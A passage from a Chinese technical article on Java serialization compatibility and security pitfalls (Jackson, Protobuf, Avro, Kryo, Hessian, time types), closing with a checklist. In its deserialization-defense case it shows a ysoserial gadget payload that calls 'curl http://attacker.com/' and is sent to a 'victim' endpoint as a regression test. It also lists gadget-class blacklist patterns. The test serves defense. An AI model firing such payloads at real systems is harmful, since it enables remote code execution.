// Spring Session Redis 配置：用 JSON 替代 JDK 序列化
@Bean
public RedisSerializer<Object> springSessionDefaultRedisSerializer() {
    return new GenericJackson2JsonRedisSerializer();
}
```

#### 验证

```java
@Test
void serialVersionUidStability() throws Exception {
    long uid = ObjectStreamClass.lookup(Promotion.class).getSerialVersionUID();
    assertEquals(1L, uid);   // 强制锁定
}

// 字节级测试：旧版本字节能否被新版本类反序列化
@Test
void backwardCompatible() throws Exception {
    byte[] oldBytes = loadResource("promotion-v1.bin");   // 提前生成的旧版本字节
    Promotion p = (Promotion) deserialize(oldBytes);
    assertNotNull(p);
}
```

> **口诀**：**Serializable 类必须显式 `serialVersionUID`**；字段类型变更等于破坏性升级；session / 缓存的序列化要和业务 RPC 分开考虑。

---

### 案例 ③ Jackson FAIL_ON_UNKNOWN_PROPERTIES —— "新增一个字段，全网消费者全挂"

#### 现象

订单服务往 Kafka 发消息，下游有 8 个消费者。某天给消息体加了一个 `couponId` 字段，**生产者发布后 5 分钟内**，3 个消费者全部抛 `UnrecognizedPropertyException` 停摆。

```
com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException:
  Unrecognized field "couponId" (class com.taohua.Order),
  not marked as ignorable
```

#### 根因

Jackson `ObjectMapper` 默认 `FAIL_ON_UNKNOWN_PROPERTIES = true`。这是为"开发阶段帮你抓拼写错误"设计的，但生产环境致命：**任何加字段都是破坏性变更**。

#### 修复

**全局关掉**（推荐）：

```java
ObjectMapper m = JsonMapper.builder()
    .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
    .build();
```

**类级别忽略**：

```java
@JsonIgnoreProperties(ignoreUnknown = true)
public class Order { ... }
```

**字段级别**（接收方可能想忽略某些字段）：

```java
public class Order {
    public long id;
    public String user;
    @JsonIgnore
    public String internalDebugInfo;   // 永远不读取，即使 JSON 里有也忽略
}
```

**配套的反向问题**：消费者升级了，期望某个字段，但生产者还没升级 —— Jackson 默认填 null。如果是 primitive `long`，会填 0，业务可能误判。建议字段都用包装类型，并配 `@JsonProperty(required = true)` + 校验逻辑。

#### 字段重命名的优雅处理

业务字段从 `userName` 改成 `user`，旧消息还在队列里。直接改类会读不出。`@JsonAlias` 救命：

```java
public class Order {
    @JsonProperty("user")
    @JsonAlias({"userName", "user_name"})
    public String user;
}
```

写出时永远用 `user`，读取时三种都接受。这就是字段演进的"过渡期保护"。

#### 验证

```java
@Test
void unknownFieldsAreIgnored() throws Exception {
    String json = "{\"id\":1,\"user\":\"alice\",\"newField\":\"x\"}";
    Order o = MAPPER.readValue(json, Order.class);
    assertEquals(1L, o.id);
    assertEquals("alice", o.user);
}
```

#### 一条铁律

**所有对外 / 跨服务的 Jackson `ObjectMapper` 必须关闭 `FAIL_ON_UNKNOWN_PROPERTIES`**，并用集中工厂方法生产，禁止业务自己 `new ObjectMapper()`。

> **口诀**：**生产者只增、不删、不改；消费者宽进、严出**。Jackson 的 `FAIL_ON_UNKNOWN_PROPERTIES` 关掉是生产基线。

---

### 案例 ④ Protobuf required 字段升级地狱 —— "v3 为什么砍掉 required"

#### 现象

老服务用 Protobuf v2，message 里有：

```protobuf
message Order {
  required int64 id = 1;
  required string user = 2;
  required string customer_email = 3;   // ★ 新加，required
}
```

灰度时新版本发出的 message 给老消费者：老消费者解析，因为它没有 `customer_email` 这个字段，**直接抛 `InvalidProtocolBufferException: Message missing required fields`**。下游消费失败、消息阻塞、积压上百万条。

#### 根因

Protobuf v2 的 `required` 语义是：**这个字段必须存在，否则消息无效**。这本来是一种"强契约"。但实际工程中：

- **新加 required 字段** → 老 client 发出的消息缺这个字段 → 新 server 拒收
- **删除 required 字段** → 老 client 期望存在 → 新 server 不发了 → 老 client 拒收
- **从 optional 升 required** 或反过来 → 双向不兼容

required 字段一旦上线，**永远不能删、不能加新的、不能从 optional 升级**。这是个完全锁死的状态。Google 内部多个核心系统因为 required 字段把团队卡死，最终在 proto3 里**整体废除 required**。

#### 修复

**Protobuf v2 时代的修复**：把 required 退回 optional，或者加一个 schema 升级中间步骤：

```protobuf
// 第一步：所有 client 改成 optional 写
required string customer_email = 3;
↓
optional string customer_email = 3;   // 必须等所有 client 升级完
```

**Protobuf v3 的设计**：所有 scalar 字段都有"零值"作为默认（int = 0、string = ""、bool = false）。"必填"由**业务层**强制，不再是 schema 层。

```protobuf
syntax = "proto3";
message Order {
  int64 id = 1;
  string customer_email = 2;   // 不存在的话默认 ""
}
```

```java
Order o = parser.parseFrom(bytes);
if (o.getCustomerEmail().isEmpty()) {     // 业务层校验
    throw new BadRequestException("email required");
}
```

**proto3.15+ 引入 `optional`**：用来区分"未设置"和"零值"：

```protobuf
optional string nickname = 5;   // o.hasNickname() 可判断是否设置
```

#### 兼容性 7 条铁律（背下来）

1. **永远不要改字段编号**
2. **删除字段必须用 `reserved` 占位**（编号 + 字段名都要）
3. **不要新增 required**（v2）；v3 没这选项
4. 字段类型变更只允许：`int32 ↔ int64 ↔ uint32 ↔ uint64 ↔ bool` 互相之间（注意精度截断）
5. `string ↔ bytes` 可互换（UTF-8 安全）
6. `enum` 新增值要在 client 默认 fallback 到 `UNKNOWN = 0`
7. `repeated` 和 `optional` 不可互相迁移

#### 验证

```bash
# 用 buf breaking 检测 schema 兼容性破坏
buf breaking --against '.git#branch=main'

# 输出会列出所有不兼容的变更
```

> **口诀**：**Protobuf required 是 schema 演进的死结**；v3 砍掉是教训不是退步；必填字段在业务层校验。

---

### 案例 ⑤ Avro Schema Registry 不一致 —— "消费者突然解不出消息"

#### 现象

Kafka 集群跑 Avro 消息很久了。某天 Confluent Schema Registry 误清理，消费者开始大量报：

```
org.apache.kafka.common.errors.SerializationException: Error retrieving Avro schema for id 12345
  Caused by: io.confluent.rest.exceptions.RestNotFoundException: Schema 12345 not found
```

整条流水线停摆。

#### 根因

Confluent 的 Avro 消息格式：

```
[magic byte: 0x00][schema_id: 4 bytes][Avro binary payload]
```

消费者必须用 `schema_id` 去 Schema Registry 查 schema，**才能解析后面的字节**。Schema Registry 不可用 = 所有消费者全部停摆。

#### 修复

**预防 1：Schema Registry 必须高可用**

- 至少 3 节点 Kafka backed（schema 存在内部 `_schemas` topic 里）
- 监控 Registry 的 RT、可用性
- 客户端配置 `schema.registry.url=http://r1:8081,http://r2:8081,http://r3:8081`

**预防 2：消费者本地缓存**

```java
Properties props = new Properties();
props.put("schema.registry.url", "http://r1:8081");
props.put("max.schemas.per.subject", 1000);   // 本地缓存上限
// Confluent KafkaAvroDeserializer 默认有 LRU 缓存
```

一旦 schema_id 进过缓存，Registry 短暂不可用不影响已有消费者。问题是**新启动**或**遇到从未见过的 schema_id** 的消费者会抛错。

**预防 3：定期备份 schema**

```bash
# 用 Schema Registry 自带的 export 工具
curl http://r1:8081/subjects | jq -r '.[]' | while read subject; do
  curl http://r1:8081/subjects/$subject/versions/latest > "$subject.avsc"
done
```

**事故处理**：

如果 Registry 数据丢失，**禁止重新注册同名 schema** —— 新注册的 id 几乎肯定和原来不同，下游消费者还是解不出旧消息。正确做法：从备份 / 副本恢复，确保 id 一致。

**进阶：兼容性策略**

Schema Registry 有 4 档兼容性：

| 策略 | 含义 | 适用 |
| --- | --- | --- |
| `BACKWARD` | 新 schema 能读旧数据 | 默认，消费者先升级 |
| `FORWARD` | 旧 schema 能读新数据 | 生产者先升级 |
| `FULL` | 上面两者都满足 | 推荐 |
| `NONE` | 不检查 | ⚠️ 仅 dev |

```bash
# 设置全局默认
curl -X PUT -H "Content-Type: application/json" \
  --data '{"compatibility": "FULL"}' \
  http://r1:8081/config

# 单 subject 设置
curl -X PUT --data '{"compatibility": "FULL"}' \
  http://r1:8081/config/orders-value
```

#### 验证

```java
@Test
void compatibilityCheck() {
    Schema oldSchema = ...;
    Schema newSchema = ...;
    SchemaCompatibility.SchemaPairCompatibility result =
        SchemaCompatibility.checkReaderWriterCompatibility(newSchema, oldSchema);
    assertEquals(SchemaCompatibility.SchemaCompatibilityType.COMPATIBLE,
        result.getType());
}
```

> **口诀**：**Schema Registry 是 Kafka 链路的单点**；兼容性策略默认 BACKWARD 不够，对外 topic 必须 FULL；schema 必须备份且 id 必须一致。

---

### 案例 ⑥ Kryo 跨版本不兼容 —— "Spark Job 切版本后状态全失效"

#### 现象

Spark 应用从 2.4 升级到 3.x，重启后所有 checkpoint 状态读不出，反序列化抛：

```
com.esotericsoftware.kryo.KryoException: Unable to find class:
  com.taohua.MyState
  Serialization trace:
    state (com.taohua.SomeWrapper)
```

或更隐蔽的：状态读出来了，但**字段值都错位了**。

#### 根因

Kryo 的两个常见问题：

**1. 类名 / 路径变更**

Kryo 默认按完整类名定位类。任何包名重构、类重命名，旧字节都读不出。

**2. 字段顺序变化**

Kryo 默认序列化方式（`FieldSerializer`）按 **字段在 class 文件中的声明顺序**写。Java 8 / 11 / 17 的反射 API 对字段顺序的稳定性**不保证一致**：

```java
class State {
    long a;
    String b;
    int c;
}
// Kryo 写出顺序：a, b, c

// 改成
class State {
    long a;
    int c;
    String b;   // 调整顺序
}
// Kryo 读旧字节：把字符串字节当成 int 读，乱码
```

#### 修复

**方案 1：强制注册 + 使用 class id**

```java
Kryo k = new Kryo();
k.setRegistrationRequired(true);
k.register(MyState.class, 100);              // 永远不变的 id
k.register(SomeWrapper.class, 101);
```

类名变了不影响 —— 字节里只存 id 100。

**方案 2：用 `CompatibleFieldSerializer` 替代默认**

```java
k.setDefaultSerializer(CompatibleFieldSerializer.class);
```

`CompatibleFieldSerializer` 在每个对象前写一次字段名列表，字段顺序变化能兼容（代价是体积增加）。

**方案 3：用 `TaggedFieldSerializer`**

类似 Protobuf 的字段 tag：

```java
class State {
    @Tag(1) long a;
    @Tag(2) String b;
    @Tag(3) int c;
}
```

字段 tag 永远不变，字段加减都安全。

**方案 4：业务版本号**

```java
class State implements KryoSerializable {
    private static final byte VERSION = 2;
    long a; int c; String b; BigDecimal d;   // v2 新加 d

    public void write(Kryo kryo, Output out) {
        out.writeByte(VERSION);
        out.writeLong(a); out.writeInt(c);
        kryo.writeObject(out, b);
        kryo.writeObject(out, d);
    }
    public void read(Kryo kryo, Input in) {
        byte v = in.readByte();
        a = in.readLong(); c = in.readInt();
        b = kryo.readObject(in, String.class);
        if (v >= 2) d = kryo.readObject(in, BigDecimal.class);
    }
}
```

控制力最强但代码侵入大。Spark / Flink 状态强烈推荐这种风格。

#### 验证

```java
@Test
void kryoStateCompatibility() {
    byte[] v1Bytes = readClasspath("state-v1.bin");
    State s = kryoRead(v1Bytes, State.class);
    assertEquals(0L, s.id);   // 默认值
}
```

#### Spark / Flink 特别提示

- Spark `spark.kryo.registrator` 要写死所有自定义类，并保持 id 稳定
- Flink 用 Avro 或 自带的 `TypeSerializer` 替代 Kryo 做状态，避免这类雷

> **口诀**：**Kryo 必须注册 class id 且永不更动**；状态序列化推荐 `CompatibleFieldSerializer` 或自定义 `KryoSerializable`；Spark / Flink 状态尽量别用默认 Kryo。

---

### 案例 ⑦ Hessian 循环引用 + 大对象 —— "Dubbo 调用一次 OOM"

#### 现象

Dubbo 服务的某个接口偶尔触发 OOM，dump 显示 `com.alibaba.com.caucho.hessian.io.SerializerFactory` 占了 5GB+。

#### 根因

业务返回的对象图：

```java
class Tree {
    Tree parent;
    List<Tree> children;
}
```

`children[i].parent` 指回当前节点 —— **循环引用**。

Hessian 默认会处理循环引用（用一个 IdentityHashMap 记录已写过的对象）。但如果**对象图有几万节点**，IdentityHashMap 本身就吃几百 MB。更糟的是 Hessian 的 IdentityHashMap **不会在序列化结束后立刻回收** —— 它持有所有对象引用，导致 GC 不掉。

另一种死法：**Map 的循环引用**。

```java
Map<String, Object> a = new HashMap<>();
Map<String, Object> b = new HashMap<>();
a.put("b", b); b.put("a", a);
```

如果序列化器没正确处理（某些 Hessian 版本对 Map 的循环引用有 bug），会 stack overflow。

#### 修复

**方案 1：业务对象不带回引**

DTO 永远是树形而非图形：

```java
class TreeDto {
    long id;
    long parentId;       // ★ 只存 ID，不存对象引用
    List<TreeDto> children;
}
```

接收方需要回引时自己重建。

**方案 2：用 `@JsonIgnore` 类似的注解切断**

```java
class Tree {
    @JsonIgnore
    Tree parent;         // 序列化时跳过
    List<Tree> children;
}
```

Hessian 自定义需要实现 `Hessian2Output`，复杂度高，不推荐。

**方案 3：限制对象图大小**

```java
// Dubbo 配置
dubbo.protocol.payload=8388608   // 单消息 8MB 上限
dubbo.protocol.serialization=hessian2
```

**方案 4：换序列化协议**

Dubbo 3 推荐 `triple` 协议 + Protobuf。Protobuf 不支持循环引用 —— 强迫业务设计成树形。

#### 验证

```java
@Test
void noCircularReference() {
    Tree root = buildTreeWithDepth(10, 5);   // 10 层、每层 5 节点
    byte[] bytes = hessianWrite(root);
    assertTrue(bytes.length < 1_000_000);   // 1MB 上限
}
```

> **口诀**：**RPC 返回值永远是 DTO 不是 Domain Object**；Domain 之间允许引用，DTO 必须树形；序列化协议要有 payload 上限。

---

### 案例 ⑧ 反序列化攻击的纵深防御 —— "黑名单永远漏，怎么办"

#### 现象

安全审计报告：服务里有 17 处 `ObjectInputStream.readObject` 调用，且有 5 处接收外部输入。问可不可以"加个黑名单"了事。

#### 根因

黑名单防御注定失败。攻击者只需要找到**一个**未被列入黑名单的 gadget chain。Java 生态大、依赖多，新 gadget 发现速度永远超过黑名单更新速度。

正确思路：**白名单 + 协议替换**。

#### 修复

**Java 9+ 的官方方案：`ObjectInputFilter`**

```java
ObjectInputStream ois = new ObjectInputStream(input);

// 白名单：只允许特定包、特定类
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.taohua.dto.*;java.lang.Number;java.util.ArrayList;!*"
    //  允许我自己的 DTO   允许 Number   允许 ArrayList    禁掉其他所有
);
ois.setObjectInputFilter(filter);

Object o = ois.readObject();   // 不在白名单的类直接抛 InvalidClassException
```

**全局过滤器**（JVM 启动参数）：

```bash
-Djdk.serialFilter='maxbytes=10000;maxdepth=20;maxrefs=500;com.taohua.**;!*'
```

参数含义：
- `maxbytes`：单次 readObject 最大字节数
- `maxdepth`：对象图最大深度
- `maxrefs`：最大引用数（防 hash collision 攻击）
- 类匹配：`!*` 表示拒绝所有未明确允许的类

**SerialKiller**（社区方案，2014 年的工具，思路被 Java 9 借鉴）：

```xml
<config>
  <whitelist>
    <regexp>com\.taohua\.dto\..*</regexp>
  </whitelist>
  <blacklist>
    <regexp>org\.apache\.commons\.collections\.functors\..*</regexp>
  </blacklist>
</config>
```

**Hessian 的过滤**：

```java
SerializerFactory factory = new SerializerFactory();
factory.getClassFactory().allow("com.taohua.dto.*");
factory.getClassFactory().deny("org.apache.commons.collections.*");

Hessian2Input in = new Hessian2Input(input);
in.setSerializerFactory(factory);
```

**Fastjson / Fastjson2**：默认 safe mode，禁用 AutoType。如果业务必须开，用 `addAccept` 白名单：

```java
ParserConfig.getGlobalInstance().addAccept("com.taohua.dto.");
```

#### 终极方案：换协议

把所有跨进程的反序列化点全部迁到 **JSON / Protobuf / Avro**。这三种协议设计上**不存在 RCE 攻击面**（它们不会按字节流"决定加载哪个类、调用哪个方法"）。

#### 验证

用 [ysoserial](https://github.com/frohoff/ysoserial) 生成 payload 跑回归：

```bash
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/' > payload.bin
curl -X POST --data-binary @payload.bin http://victim/api/legacy

# 期望：服务端日志看到 "REJECTED ObjectInputFilter"
```

> **口诀**：**反序列化漏洞的根治是换协议，不是补黑名单**；非换不可时用 `ObjectInputFilter` 白名单 + 启动参数 + 网络层 WAF 三重纵深。

---

### 案例 ⑨ 时间类型序列化坑 —— "Date 在 8 个时区错了 8 种结果"

#### 现象

跨国部署的服务，订单创建时间 `2026-05-09 14:30:00 +08:00` 经过：

- 上海机房用 Jackson 写 JSON：`"2026-05-09T06:30:00.000Z"` （转 UTC）
- 转发到伦敦机房，反序列化：`2026-05-09 06:30:00`，被当 UTC 重新格式化输出 → `"2026-05-09 07:30:00 BST"` ← 错了 8 小时
- 上海团队看到伦敦给的报表，订单时间凭空变了 1 小时

更隐蔽的：`java.util.Date` 在 Jackson 默认序列化为 timestamp（long）：

```json
{"createdAt": 1715234400000}
```

数字本身没歧义，但**显示**到前端时如果不带时区，依然出错。

#### 根因

时间类型是序列化里出错率最高的类型。原因：

1. `java.util.Date` 内部是 UTC 毫秒数，但 `toString()` 用 JVM 默认时区 → **不同 JVM 看 Date 显示不同**
2. `LocalDateTime` **没有时区信息** → 序列化成字符串后丢失语义
3. `ZonedDateTime` / `OffsetDateTime` 自带时区，但序列化方式各家不一
4. Protobuf 的 `Timestamp` 是 UTC 秒 + 纳秒，永远没歧义，但 Java 端要手动转换

#### 修复

**铁律 1：业务字段统一用 `Instant`（UTC 瞬时）或 `OffsetDateTime`（带偏移）**

```java
public class Order {
    public Instant createdAt;            // ★ 推荐
    public OffsetDateTime expiredAt;     // ★ 也可
    // public LocalDateTime ...          // ❌ 禁用：没时区
    // public Date ...                   // ❌ 禁用：旧 API
}
```

**铁律 2：Jackson 显式配置**

```java
JsonMapper.builder()
    .addModule(new JavaTimeModule())
    .disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS)   // 用 ISO-8601 字符串
    .disable(SerializationFeature.WRITE_DATES_WITH_ZONE_ID)    // 不要写 [Asia/Shanghai] 这种 Java 私有格式
    .build();
```

输出：`"2026-05-09T06:30:00Z"` —— ISO-8601，全球语言通用。

**铁律 3：JVM 启动统一时区（最佳实践是 UTC）**

```bash
-Duser.timezone=UTC
```

容器镜像基础层就改：

```dockerfile
ENV TZ=UTC
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone
```

**铁律 4：Protobuf 用 `google.protobuf.Timestamp`**

```protobuf
import "google/protobuf/timestamp.proto";

message Order {
  google.protobuf.Timestamp created_at = 1;
}
```

```java
Order o = Order.newBuilder()
    .setCreatedAt(Timestamps.fromMillis(instant.toEpochMilli()))
    .build();

Instant back = Instant.ofEpochSecond(
    o.getCreatedAt().getSeconds(),
    o.getCreatedAt().getNanos());
```

**铁律 5：MySQL 字段用 `TIMESTAMP`（自动转 UTC 存）而非 `DATETIME`**

`DATETIME` 字面量存储，没时区；`TIMESTAMP` 内部按 UTC 存、按会话时区显示。

#### 验证

```java
@Test
void timeRoundTrip() throws Exception {
    Instant t = Instant.parse("2026-05-09T06:30:00Z");
    Order o = new Order(); o.createdAt = t;
    String json = MAPPER.writeValueAsString(o);
    Order back = MAPPER.readValue(json, Order.class);
    assertEquals(t, back.createdAt);     // 必须 bit-equal
    assertTrue(json.contains("2026-05-09T06:30:00Z"));
}

@Test
void crossTimezone() throws Exception {
    TimeZone.setDefault(TimeZone.getTimeZone("Asia/Shanghai"));
    String json1 = MAPPER.writeValueAsString(order);

    TimeZone.setDefault(TimeZone.getTimeZone("Europe/London"));
    String json2 = MAPPER.writeValueAsString(order);

    assertEquals(json1, json2);   // 不应受 JVM 默认时区影响
}
```

> **口诀**：**字段 Instant、协议 ISO-8601、JVM UTC、DB TIMESTAMP**。Date / LocalDateTime 是历史负债，新代码一律避免。

---

## 5. 上线检查清单

打印贴墙 / 加进 Code Review checklist。

### 协议选型层
- [ ] 内部 RPC 用 Protobuf / gRPC，不用 Java Serial / Hessian
- [ ] 对外 HTTP API 用 Jackson JSON，不用 Fastjson 1.x
- [ ] Spark / Flink 状态用 Avro 或自定义 `TypeSerializer`，不用默认 Kryo
- [ ] Kafka 消息选 Avro + Schema Registry 或 Protobuf，不用 JSON（除非容量极小）

### Jackson 层
- [ ] `ObjectMapper` 单例化，禁止业务 `new ObjectMapper()`
- [ ] 关闭 `FAIL_ON_UNKNOWN_PROPERTIES`（生产配置）
- [ ] 启用 `STRICT_DUPLICATE_DETECTION`
- [ ] 注册 `JavaTimeModule` 并禁用 `WRITE_DATES_AS_TIMESTAMPS`
- [ ] 配置 `StreamReadConstraints`，限制 maxStringLength / maxNestingDepth
- [ ] 字段重命名通过 `@JsonAlias` 过渡，不直接改

### Protobuf 层
- [ ] 字段编号永不变更，删除字段必加 `reserved`（编号 + 字段名）
- [ ] proto3 中需"必填"的字段在业务层校验，不依赖 schema
- [ ] 时间字段统一用 `google.protobuf.Timestamp`
- [ ] CI 接入 `buf breaking` 检测兼容性破坏
- [ ] 跨语言协议必须验证所有目标语言的 int64 / Decimal / Date 处理

### Kryo 层
- [ ] `setRegistrationRequired(true)`
- [ ] 所有类显式 `register(Class, id)` 且 id 永不变
- [ ] 状态类用 `CompatibleFieldSerializer` 或 `TaggedFieldSerializer`
- [ ] Kryo 实例 ThreadLocal 化或使用 KryoPool

### 安全层
- [ ] 任何 `ObjectInputStream.readObject` 必须配 `ObjectInputFilter` 白名单
- [ ] JVM 启动参数加 `-Djdk.serialFilter` 全局过滤
- [ ] Fastjson 1.x 必须升级或彻底关闭 AutoType
- [ ] Hessian 配 `SerializerFactory.allow / deny` 白名单
- [ ] 反序列化点用 ysoserial 跑回归测试

### 兼容性层
- [ ] 所有 schema 演进遵循"只增不删不改"原则；删除走 `reserved` 流程
- [ ] Schema Registry 设全局 `FULL` 兼容性
- [ ] CI 自动跑"旧版本字节 → 新版本类"测试

### 性能层
- [ ] 大对象（> 1MB）禁用 JSON，改 Protobuf / Kryo
- [ ] 高 QPS 场景预留对象池或 ThreadLocal buffer
- [ ] 不要循环引用的对象做 RPC 返回值（用 DTO 树形）

### 时间与本地化层
- [ ] 字段类型用 `Instant` / `OffsetDateTime`，禁用 `Date` / `LocalDateTime`
- [ ] JVM 启动 `-Duser.timezone=UTC`
- [ ] MySQL 字段用 `TIMESTAMP` 而非 `DATETIME`
- [ ] BigDecimal 跨语言传输时用字符串

### 监控层
- [ ] 序列化 / 反序列化耗时埋点（Micrometer Timer）
- [ ] 反序列化失败 / 拒绝有专门的告警
- [ ] Schema Registry 的 RT、可用性监控

---

## 6. 还能往下挖什么

读完上面 9 个案例只是起点。如果想再深一层：

### 高性能方案
- **Cap'n Proto**：FlatBuffers 的"姐妹方案"，Sandstorm 团队出品。语义比 FlatBuffers 更严格，schema 描述能力更强。
- **SBE**（Simple Binary Encoding）：金融行业（FIX、CME）的低延迟标准，纳秒级编解码，专为单机交易系统设计。
- **Apache Arrow**：列式内存格式 + 零拷贝。OLAP 引擎、ML 数据交换的事实标准。Spark / Pandas / Polars 都在用。
- **Apache Thrift**：Facebook 出品，比 Protobuf 早，但生态被 gRPC 反超。仍在 Hadoop / Cassandra 内部使用。

### Schema 与 API
- **JSON Schema**：JSON 的类型系统。能描述 enum、范围、模式匹配。OpenAPI 3.x 的契约就基于它。
- **OpenAPI / Swagger**：HTTP API 的契约，能直接生成 client / server stub。
- **JSON-LD**：带语义的 JSON，主要在 Schema.org / 知识图谱场景。

### 安全审计
- **SerialKiller**：社区反序列化白名单库，思路被 JEP 290 采纳。
- **gadget-inspector**：扫描 jar 包中潜在 gadget chain 的工具。
- **JEP 290**（Java 9）/ JEP 415（Java 17）：官方反序列化过滤器演进路径。
- **Java 序列化"被弃用"路线图**：JEP 154 → JEP 415 → 未来可能彻底移除。

### 运行时
- **GraalVM Native Image** 与序列化：反射 / 动态类加载在 native 模式下不可用。Jackson、Gson、Kryo 都需要专门的配置文件（reflect-config.json）。
- **Project Valhalla**（值类型）：JEP 401 的 inline class 序列化语义。值类型没有"对象身份"，循环引用本来就不存在，这给序列化设计带来新可能。
- **JDK 21 ScopedValue**：替代 ThreadLocal，对虚拟线程友好；序列化框架的上下文传递可能受影响。

### 大数据格式
- **Parquet**：列式存储，列内编码极致压缩（RLE、Dictionary、Delta）。
- **ORC**：Hive 出身，类似 Parquet，工程上和 Parquet 二选一。
- **Avro vs Parquet**：行式 vs 列式，写多读多 vs 写少读多，OLTP vs OLAP 的典型分野。

### 协议演进的工程化
- **Buf** / **Protokt**：现代化的 Protobuf 工具链，linting、breaking change 检测、远程仓库。
- **Confluent Schema Registry** vs **Apicurio**：开源 vs 商业的取舍。

---

## 7. 引用

- *Effective Java* 3rd Edition, Item 85: Prefer alternatives to Java serialization, Joshua Bloch, 2018
- [Protocol Buffers Language Guide (proto3)](https://protobuf.dev/programming-guides/proto3/)
- [FlatBuffers Documentation](https://flatbuffers.dev/)
- [Kryo Wiki](https://github.com/EsotericSoftware/kryo/wiki)
- [Apache Avro Specification](https://avro.apache.org/docs/current/specification/)
- [Confluent Schema Registry Docs](https://docs.confluent.io/platform/current/schema-registry/index.html)
- JEP 290: Filter Incoming Serialization Data
- JEP 415: Context-Specific Deserialization Filters
- [ysoserial](https://github.com/frohoff/ysoserial) —— Java 反序列化漏洞 PoC 工具集
- CVE-2017-9805 (Apache Struts2), CVE-2021-44228 (Log4Shell), CVE-2021-43297 (Dubbo Hessian)
- [Cap'n Proto](https://capnproto.org/) by Kenton Varda
- [Apache Arrow Format](https://arrow.apache.org/docs/format/Columnar.html)

---

> 配套：[API 设计与 OpenAPI](/article/architecture/api-design) | [Web 安全实战](/article/security/security-deep) | [Kafka 存储引擎](/article/mq/kafka-storage)
> 这是按 [桃花岛深度模板](/STYLE) 写的深文。
